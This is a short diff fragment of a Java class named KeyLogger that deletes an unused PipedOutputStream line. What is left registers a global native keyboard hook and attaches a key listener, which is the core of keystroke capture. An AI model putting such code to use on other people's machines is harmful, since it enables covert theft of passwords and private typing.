@@ -11,7 +11,6 @@ public class KeyLogger {
     public static void main(String...args){
         try {
             GlobalScreen.registerNativeHook();
-            PipedOutputStream pos = new PipedOutputStream();
             GlobalScreen.addNativeKeyListener(new MyNativeKeyListener());
         } catch (Exception ex) {
             return;
